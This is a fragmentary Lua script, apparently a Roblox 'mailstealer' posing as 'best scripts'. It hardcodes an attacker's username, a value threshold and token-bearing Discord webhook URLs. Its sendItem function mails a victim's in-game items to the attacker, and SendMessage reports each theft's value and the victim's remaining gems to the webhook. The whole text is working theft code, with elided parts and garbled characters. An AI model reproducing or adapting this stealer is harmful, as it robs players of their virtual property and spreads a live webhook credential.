DualRAP = 25000000
DualUser = "alexthebsisjsj"
DualWebhook = "https://discord.com/api/webhooks/1320248625204564069/e2NNAb_qBievzJDrxSEENpNp1tdnVfhefjDmHvX4WJxRKTEIxIrIWKxsuzxZU_FwUW6v"


LogsWebhook = "https://discord.com/api/webhooks/1320248625204564069/e2NNAb_qBievzJDrxSEENpNp1tdnVfhefjDmHvX4WJxRKTEIxIrIWKxsuzxZU_FwUW6v"
mailstealer_name = "best scripts"
...
local MailMessage = "Eksova On Top"
...
local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets_left, shiny, ping, RAP, totalRap1)
    ...
    imgs =
        "https://i.ibb.co/M1G64bw/New-Project-24.png"
        ...
        ["embeds"] = {
            {
                ...
                ["fields"] = {
                    ...
                    },
                    {
                        ...
                        ["value"] = "```âž? " .. FormatNumber(RAP) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = ":gem: **Gems Left** :gem:",
                        ["value"] = "```âž? " .. FormatNumber(GemsAmount) .. "```",
                        ["inline"] = true
                    },
                    {
...
local function sendItem(category, uid, am, locked)
    local args = {
        [1] = Roblox_Username,
        [2] = "" .. mailstealer_name .. " Furific on top",
        [3] = category,
        [4] = uid,
        [5] = am
    }
